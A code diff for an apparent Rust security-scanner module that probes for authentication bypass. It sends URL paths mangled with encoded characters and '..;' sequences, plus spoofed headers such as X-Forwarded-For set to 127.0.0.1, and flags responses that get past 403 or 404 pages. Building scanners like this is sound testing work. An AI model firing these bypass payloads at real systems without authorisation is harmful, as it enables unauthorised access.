@@ -1,46 +1,63 @@
-use std::{str::FromStr, vec, sync::Arc};
+use std::{str::FromStr, sync::Arc, vec};
 
-use hyper::{Uri, Method, StatusCode, HeaderMap, body::Bytes, http::HeaderValue, header::HOST};
+use hyper::{body::Bytes, header::HOST, http::HeaderValue, HeaderMap, Method, StatusCode, Uri};
 use log::error;
+use once_cell::sync::Lazy;
 use strsim::normalized_levenshtein;
 
-use crate::{modules::{IActive, ModuleMeta, ModuleType, Issue, IssueLevel, IssueConfidence}, librs::http::utils::HttpRequest, st_error, utils::STError};
+use crate::{
+    librs::http::utils::HttpRequest,
+    modules::{IActive, Issue, IssueConfidence, IssueLevel, ModuleMeta, ModuleType},
+    st_error,
+    utils::STError,
+};
 
 pub struct UnauthBypass {
     meta: Option<ModuleMeta>,
 }
 
-fn run(method: Method, url: &str, headers: &HeaderMap, body: Arc<Bytes>) -> Result<Vec<crate::modules::Issue>,crate::utils::STError> {
+static HEADER_PAYLOADS: Lazy<Vec<(&str, &str)>> = Lazy::new(|| {vec![
+        ("Client-IP", "127.0.0.1"),
+        ("X-Real-Ip", "127.0.0.1"),
+        ("Redirect", "127.0.0.1"),
+        ("Referer", "127.0.0.1"),
+        ("X-Client-IP", "127.0.0.1"),
+        ("X-Custom-IP-Authorization", "127.0.0.1"),
+        ("X-Forwarded-By", "127.0.0.1"),
+        ("X-Forwarded-For", "127.0.0.1"),
+        ("X-Forwarded-Host", "127.0.0.1"),
+        ("X-Forwarded-Port", "80"),
+        ("X-True-IP", "127.0.0.1"),
+    ]
+});
+
+
+fn run(
+    method: Method,
+    url: &str,
+    headers: &HeaderMap,
+    body: Arc<Bytes>,
+) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
     let payloads = vec![
-        "%09",
-        "%20" ,
-        "%23" ,
-        "%2e" ,
-        "%2f" ,
-        "." ,
-        ";" ,
-        "..;" ,
-        ";%09" ,
-        ";%09.." ,
-        ";%09..;" ,
-        ";%2f.." ,
-        "*" 
+        "%09", "%20", "%23", "%2e", "%2f", ".", ";", "..;", ";%09", ";%09..", ";%09..;", ";%2f..",
+        "*",
     ];
+
     
     let uri = match Uri::from_str(url) {
         Ok(u) => u,
         Err(e) => {
-            let msg = format!("{}",e);
+            let msg = format!("{}", e);
             return Err(STError::new(&msg));
         }
     };
     let host_with_port = Arc::new(match uri.port() {
-        Some(s) => format!("{}:{}", uri.host().unwrap(),uri.port_u16().unwrap()),
+        Some(s) => format!("{}:{}", uri.host().unwrap(), uri.port_u16().unwrap()),
         None => {
-            format!("{}",uri.host().unwrap())
+            format!("{}", uri.host().unwrap())
         }
     });
-    let not_found = match HttpRequest::from_url(&format!("{}sdfdsfsdfgdf",url)) {
+    let not_found = match HttpRequest::from_url(&format!("{}sdfdsfsdfgdf", url)) {
         Ok(o) => o,
         Err(e) => {
             return Err(e);
@@ -53,7 +70,10 @@ fn run(method: Method, url: &str, headers: &HeaderMap, body: Arc<Bytes>) -> Resu
         }
     };
     let not_found = Arc::new(String::from_utf8_lossy(&resp.get_body()).to_string());
-    let rt = tokio::runtime::Builder::new_current_thread().enable_all().build().unwrap();
+    let rt = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .unwrap();
     let nodes = uri.path().split("/").collect::<Vec<&str>>();
     let mut i = 0;
     let mut handles = vec![];
@@ -70,72 +90,87 @@ fn run(method: Method, url: &str, headers: &HeaderMap, body: Arc<Bytes>) -> Resu
             let target_u = match uri.port() {
                 Some(o) => {
                     let h = match uri.host() {
-                        Some(s) => {
-                            s
-                        },
+                        Some(s) => s,
                         None => {
-                            let m = format!("error host {}",url);
+                            let m = format!("error host {}", url);
                             return Err(STError::new(&m));
                         }
                     };
-                    format!("{}://{}:{}{}?{}",uri.scheme_str().unwrap(), 
-                    h,o,payload_path,uri.query().unwrap_or(""))
-                },
+                    format!(
+                        "{}://{}:{}{}?{}",
+                        uri.scheme_str().unwrap(),
+                        h,
+                        o,
+                        payload_path,
+                        uri.query().unwrap_or("")
+                    )
+                }
                 None => {
                     let h = match uri.host() {
-                        Some(s) => {
-                            s
-                        },
+                        Some(s) => s,
                         None => {
-                            let m = format!("error host {}",url);
+                            let m = format!("error host {}", url);
                             return Err(STError::new(&m));
                         }
                     };
-                    format!("{}://{}{}?{}",uri.scheme_str().unwrap(), 
-                    h,payload_path,uri.query().unwrap_or(""))
+                    format!(
+                        "{}://{}{}?{}",
+                        uri.scheme_str().unwrap(),
+                        h,
+                        payload_path,
+                        uri.query().unwrap_or("")
+                    )
                 }
             };
 
-            let mut request = match HttpRequest::from_url(&target_u) {
-                Ok(o) => o,
-                Err(e) => {
-                    return Err(e);
-                }
-            };
-            request.set_headers(headers);
-            request.set_body(body.clone());
-            let m = method.clone();
-            let not_found2 = not_found.clone();
-            let h_port = host_with_port.clone();
-            let handle = rt.spawn(async move {
-                let resp = match HttpRequest::send_async(m, &request).await {
+            
+            for header in HEADER_PAYLOADS.iter() {
+                let mut request = match HttpRequest::from_url(&target_u) {
                     Ok(o) => o,
                     Err(e) => {
-                        error!("{}",e);
-                        return ;
+                        return Err(e);
                     }
                 };
-
-                if resp.get_status().eq(&StatusCode::FORBIDDEN) || resp.get_status().eq(&StatusCode::NOT_FOUND) {
-                    return ;
-                }
-                let content = String::from_utf8_lossy(&resp.get_body()).to_string();
-                if normalized_levenshtein(&content, &not_found2) > 0.9 {
-                    return ;   
-                }
-                
-                let issue = Issue::new(
-                    "unauth_bypass",
-                    IssueLevel::HighRisk,
-                    "",
-                    IssueConfidence::Confirm,
-                    &h_port
-                );
-
-                Issue::add_issue(issue, &Arc::new(resp.get_httplog()))
-
-            });
-            handles.push(handle);
+                request.set_headers(headers);
+                request.set_body(body.clone());
+                let m = method.clone();
+                let not_found2 = not_found.clone();
+                let h_port = host_with_port.clone();
+                let mut r = request.clone();
+                let handle = rt.spawn(async move {
+                    r.set_header(header.0, header.1);
+                    let resp = match HttpRequest::send_async(m, &r).await {
+                        Ok(o) => o,
+                        Err(e) => {
+                            error!("{}", e);
+                            return;
+                        }
+                    };
+    
+                    if resp.get_status().eq(&StatusCode::FORBIDDEN)
+                        || resp.get_status().eq(&StatusCode::NOT_FOUND)
+                    {
+                        return;
+                    }
+                    let content = String::from_utf8_lossy(&resp.get_body()).to_string();
+                    if normalized_levenshtein(&content, &not_found2) > 0.9 {
+                        return;
+                    }
+    
+                    let issue = Issue::new(
+                        "unauth_bypass",
+                        IssueLevel::HighRisk,
+                        "",
+                        IssueConfidence::Confirm,
+                        &h_port,
+                    );
+    
+                    Issue::add_issue(issue, &Arc::new(resp.get_httplog()))
+                });
+                handles.push(handle);
+                request.remove_header(header.0);
+            }
+            
         }
         i += 1
     }
@@ -148,7 +183,6 @@ fn run(method: Method, url: &str, headers: &HeaderMap, body: Arc<Bytes>) -> Resu
                     continue;
                 }
             };
-
         }
     });
 
@@ -156,13 +190,17 @@ fn run(method: Method, url: &str, headers: &HeaderMap, body: Arc<Bytes>) -> Resu
 }
 
 impl IActive for UnauthBypass {
-    fn passive_run(&self, index: u32) -> Result<Vec<crate::modules::Issue>,crate::utils::STError> {
+    fn passive_run(&self, index: u32) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
         let result = Vec::default();
         println!("passive_run...");
         return Ok(result);
     }
 
-    fn active_run(&self, url: &str, args: crate::modules::Args) -> Result<Vec<crate::modules::Issue>,crate::utils::STError> {
+    fn active_run(
+        &self,
+        url: &str,
+        args: crate::modules::Args,
+    ) -> Result<Vec<crate::modules::Issue>, crate::utils::STError> {
         let result = Vec::default();
         let uri = match Uri::from_str(url) {
             Ok(o) => o,
@@ -172,16 +210,16 @@ impl IActive for UnauthBypass {
         };
         let host_with_port = match uri.port() {
             Some(port) => {
-                format!("{}:{}",uri.host().unwrap(), port)
-            },
+                format!("{}:{}", uri.host().unwrap(), port)
+            }
             None => {
-                format!("{}",uri.host().unwrap())
+                format!("{}", uri.host().unwrap())
             }
         };
         let mut headers = HeaderMap::new();
         let host_key = HeaderValue::from_str("host").unwrap();
         headers.insert(HOST, host_with_port.parse().unwrap());
-        let s = run(Method::GET, url,&headers,Arc::new(Bytes::from("")));
+        let s = run(Method::GET, url, &headers, Arc::new(Bytes::from("")));
         return Ok(result);
     }
 
